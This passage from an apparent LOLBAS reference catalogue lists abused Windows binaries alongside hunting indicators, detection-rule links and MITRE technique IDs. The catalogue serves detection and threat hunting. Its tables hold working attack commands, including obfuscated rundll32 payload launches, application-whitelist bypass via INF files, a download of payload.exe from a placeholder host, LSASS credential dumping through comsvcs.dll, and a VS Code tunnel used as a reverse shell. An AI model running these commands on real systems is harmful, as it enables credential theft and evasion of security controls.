| **Execute** | `T1218.011` | `User` | `rundll32.exe shell32.dll,ShellExec_RunDLL beacon.exe` | Run an executable payload. |
| **Execute** | `T1218.011` | `User` | `rundll32 SHELL32.DLL,ShellExec_RunDLL "cmd.exe" "/c echo hi"` | Run an executable payload. |

### `Shimgvw.dll` (`yml/OSLibraries/Shimgvw.yml`)
- **Description:** Photo Gallery Viewer
- **CROW Innovations LOLBAS Source:** [`yml/OSLibraries/Shimgvw.yml`](https://github.com/CROWInnovations/LOLBAS/blob/master/yml/OSLibraries/Shimgvw.yml) | Raw YAML: `https://raw.githubusercontent.com/CROWInnovations/LOLBAS/master/yml/OSLibraries/Shimgvw.yml`
- **Default Windows Paths:** `c:\windows\system32\shimgvw.dll`, `c:\windows\syswow64\shimgvw.dll`
- **Key Forensic / Hunt IOCs:** `Execution of rundll32.exe with 'ImageView_Fullscreen' and a protocol handler ('://') on the command line`
- **Detection Rules:** [Sigma](https://github.com/SigmaHQ/sigma/blob/e1a713d264ac072bb76b5c4e5f41315a015d3f41/rules/windows/process_creation/proc_creation_win_rundll32_susp_activity.yml)

| Category | MITRE ATT&CK | Privileges | Verified Command (`CMD` / `PowerShell`) | Tactical Use Case |
| :--- | :--- | :--- | :--- | :--- |
| **Download** | `T1105` | `User` | `rundll32.exe c:\Windows\System32\shimgvw.dll,ImageView_Fullscreen http://x.x.x.x/payload.exe` | Download file from remote location. |

### `Syssetup.dll` (`yml/OSLibraries/Syssetup.yml`)
- **Description:** Windows NT System Setup
- **CROW Innovations LOLBAS Source:** [`yml/OSLibraries/Syssetup.yml`](https://github.com/CROWInnovations/LOLBAS/blob/master/yml/OSLibraries/Syssetup.yml) | Raw YAML: `https://raw.githubusercontent.com/CROWInnovations/LOLBAS/master/yml/OSLibraries/Syssetup.yml`
- **Default Windows Paths:** `c:\windows\system32\syssetup.dll`, `c:\windows\syswow64\syssetup.dll`
- **Detection Rules:** [Sigma](https://github.com/SigmaHQ/sigma/blob/62d4fd26b05f4d81973e7c8e80d7c1a0c6a29d0e/rules/windows/process_creation/proc_creation_win_rundll32_susp_activity.yml), [Splunk](https://github.com/splunk/security_content/blob/86a5b644a44240f01274c8b74d19a435c7dae66e/detections/endpoint/detect_rundll32_application_control_bypass___syssetup.yml)

| Category | MITRE ATT&CK | Privileges | Verified Command (`CMD` / `PowerShell`) | Tactical Use Case |
| :--- | :--- | :--- | :--- | :--- |
| **AWL Bypass** | `T1218.011` | `User` | `rundll32.exe syssetup.dll,SetupInfObjectInstallAction DefaultInstall 128 c:\test\shady.inf` | Run local or remote script(let) code through INF file specification (Note May pop an error window). |
| **Execute** | `T1218.011` | `User` | `rundll32 syssetup.dll,SetupInfObjectInstallAction DefaultInstall 128 c:\temp\something.inf` | Load an executable payload. |

### `Url.dll` (`yml/OSLibraries/Url.yml`)
- **Description:** Internet Shortcut Shell Extension DLL.
- **CROW Innovations LOLBAS Source:** [`yml/OSLibraries/Url.yml`](https://github.com/CROWInnovations/LOLBAS/blob/master/yml/OSLibraries/Url.yml) | Raw YAML: `https://raw.githubusercontent.com/CROWInnovations/LOLBAS/master/yml/OSLibraries/Url.yml`
- **Default Windows Paths:** `c:\windows\system32\url.dll`, `c:\windows\syswow64\url.dll`
- **Detection Rules:** [Sigma](https://github.com/SigmaHQ/sigma/blob/62d4fd26b05f4d81973e7c8e80d7c1a0c6a29d0e/rules/windows/process_creation/proc_creation_win_rundll32_susp_activity.yml)

| Category | MITRE ATT&CK | Privileges | Verified Command (`CMD` / `PowerShell`) | Tactical Use Case |
| :--- | :--- | :--- | :--- | :--- |
| **Execute** | `T1218.011` | `User` | `rundll32.exe url.dll,OpenURL "C:\test\calc.hta"` | Invoke an HTML Application via mshta.exe (Default Handler). |
| **Execute** | `T1218.011` | `User` | `rundll32.exe url.dll,OpenURL "C:\test\calc.url"` | Load an executable payload by calling a .url file with or without quotes. |
| **Execute** | `T1218.011` | `User` | `rundll32.exe url.dll,OpenURL file://^C^:^/^W^i^n^d^o^w^s^/^s^y^s^t^e^m^3^2^/^c^a^l^c^.^e^x^e` | Load an executable payload by specifying the file protocol handler (obfuscated). |
| **Execute** | `T1218.011` | `User` | `rundll32.exe url.dll,FileProtocolHandler calc.exe` | Launch an executable. |
| **Execute** | `T1218.011` | `User` | `rundll32.exe url.dll,FileProtocolHandler file://^C^:^/^W^i^n^d^o^w^s^/^s^y^s^t^e^m^3^2^/^c^a^l^c^.^e^x^e` | Load an executable payload by specifying the file protocol handler (obfuscated). |
| **Execute** | `T1218.011` | `User` | `rundll32.exe url.dll,FileProtocolHandler file:///C:/test/test.hta` | Invoke an HTML Application via mshta.exe (Default Handler). |

### `Zipfldr.dll` (`yml/OSLibraries/Zipfldr.yml`)
- **Description:** Compressed Folder library
- **CROW Innovations LOLBAS Source:** [`yml/OSLibraries/Zipfldr.yml`](https://github.com/CROWInnovations/LOLBAS/blob/master/yml/OSLibraries/Zipfldr.yml) | Raw YAML: `https://raw.githubusercontent.com/CROWInnovations/LOLBAS/master/yml/OSLibraries/Zipfldr.yml`
- **Default Windows Paths:** `c:\windows\system32\zipfldr.dll`, `c:\windows\syswow64\zipfldr.dll`
- **Detection Rules:** [Sigma](https://github.com/SigmaHQ/sigma/blob/62d4fd26b05f4d81973e7c8e80d7c1a0c6a29d0e/rules/windows/process_creation/proc_creation_win_rundll32_susp_activity.yml)

| Category | MITRE ATT&CK | Privileges | Verified Command (`CMD` / `PowerShell`) | Tactical Use Case |
| :--- | :--- | :--- | :--- | :--- |
| **Execute** | `T1218.011` | `User` | `rundll32.exe zipfldr.dll,RouteTheCall calc.exe` | Launch an executable. |
| **Execute** | `T1218.011` | `User` | `rundll32.exe zipfldr.dll,RouteTheCall file://^C^:^/^W^i^n^d^o^w^s^/^s^y^s^t^e^m^3^2^/^c^a^l^c^.^e^x^e` | Launch an executable. |

### `Comsvcs.dll` (`yml/OSLibraries/comsvcs.yml`)
- **Description:** COM+ Services
- **CROW Innovations LOLBAS Source:** [`yml/OSLibraries/comsvcs.yml`](https://github.com/CROWInnovations/LOLBAS/blob/master/yml/OSLibraries/comsvcs.yml) | Raw YAML: `https://raw.githubusercontent.com/CROWInnovations/LOLBAS/master/yml/OSLibraries/comsvcs.yml`
- **Default Windows Paths:** `c:\windows\system32\comsvcs.dll`
- **Detection Rules:** [Sigma](https://github.com/SigmaHQ/sigma/blob/c04bef2fbbe8beff6c7620d5d7ea6872dbe7acba/rules/windows/process_creation/proc_creation_win_rundll32_process_dump_via_comsvcs.yml), [Sigma](https://github.com/SigmaHQ/sigma/blob/683b63f8184b93c9564c4310d10c571cbe367e1e/rules/windows/process_access/proc_access_win_lsass_dump_comsvcs_dll.yml), [Elastic](https://github.com/elastic/detection-rules/blob/5bdf70e72c6cd4547624c521108189af994af449/rules/windows/credential_access_cmdline_dump_tool.toml), [Splunk](https://github.com/splunk/security_content/blob/86a5b644a44240f01274c8b74d19a435c7dae66e/detections/endpoint/dump_lsass_via_comsvcs_dll.yml)

| Category | MITRE ATT&CK | Privileges | Verified Command (`CMD` / `PowerShell`) | Tactical Use Case |
| :--- | :--- | :--- | :--- | :--- |
| **Dump** | `T1003.001` | `SYSTEM` | `rundll32 C:\windows\system32\comsvcs.dll MiniDump [LSASS_PID] dump.bin full` | Dump Lsass.exe process memory to retrieve credentials. |


---

## 3. Honorable Mentions (`yml/HonorableMentions` — 2 Entries)

### `code.exe` (`yml/HonorableMentions/Code.yml`)
- **Description:** VSCode binary, also portable (CLI) version
- **CROW Innovations LOLBAS Source:** [`yml/HonorableMentions/Code.yml`](https://github.com/CROWInnovations/LOLBAS/blob/master/yml/HonorableMentions/Code.yml) | Raw YAML: `https://raw.githubusercontent.com/CROWInnovations/LOLBAS/master/yml/HonorableMentions/Code.yml`
- **Default Windows Paths:** `%LOCALAPPDATA%\Programs\Microsoft VS Code\Code.exe`, `C:\Program Files\Microsoft VS Code\Code.exe`, `C:\Program Files (x86)\Microsoft VS Code\Code.exe`
- **Key Forensic / Hunt IOCs:** `Websocket traffic to global.rel.tunnels.api.visualstudio.com`; `Process tree: code.exe -> cmd.exe -> node.exe -> winpty-agent.exe`; `File write of code_tunnel.json which is parametizable, but defaults to: %UserProfile%\.vscode-cli\code_tunnel.json`

| Category | MITRE ATT&CK | Privileges | Verified Command (`CMD` / `PowerShell`) | Tactical Use Case |
| :--- | :--- | :--- | :--- | :--- |
| **Execute** | `T1219` | `User` | `code.exe tunnel --accept-server-license-terms --name "tunnel-name"` | Reverse PowerShell session over MS provided infrastructure. |

### `GfxDownloadWrapper.exe` (`yml/HonorableMentions/GfxDownloadWrapper.yml`)
- **Description:** Remote file download used by the Intel Graphics Control Panel, receives as first parameter a URL and a destination file path.
- **CROW Innovations LOLBAS Source:** [`yml/HonorableMentions/GfxDownloadWrapper.yml`](https://github.com/CROWInnovations/LOLBAS/blob/master/yml/HonorableMentions/GfxDownloadWrapper.yml) | Raw YAML: `https://raw.githubusercontent.com/CROWInnovations/LOLBAS/master/yml/HonorableMentions/GfxDownloadWrapper.yml`
- **Default Windows Paths:** `c:\windows\system32\driverstore\filerepository\64kb6472.inf_amd64_3daef03bbe98572b\`, `c:\windows\system32\driverstore\filerepository\cui_comp.inf_amd64_0e9c57ae3396e055\`, `c:\windows\system32\driverstore\filerepository\cui_comp.inf_amd64_209bd95d56b1ac2d\`, `c:\windows\system32\driverstore\filerepository\cui_comp.inf_amd64_3fa2a843f8b7f16d\` (+152 more)
- **Key Forensic / Hunt IOCs:** `Usually GfxDownloadWrapper downloads a JSON file from https://gameplayapi.intel.com.`
- **Detection Rules:** [Sigma](https://github.com/SigmaHQ/sigma/blob/62d4fd26b05f4d81973e7c8e80d7c1a0c6a29d0e/rules/windows/process_creation/proc_creation_win_lolbin_gfxdownloadwrapper_file_download.yml)

| Category | MITRE ATT&CK | Privileges | Verified Command (`CMD` / `PowerShell`) | Tactical Use Case |
| :--- | :--- | :--- | :--- | :--- |
| **Download** | `T1105` | `User` | `C:\Windows\System32\DriverStore\FileRepository\igdlh64.inf_amd64_[0-9]+\GfxDownloadWrapper.exe "URL" "DESTINATION FILE"` | Download file from internet |

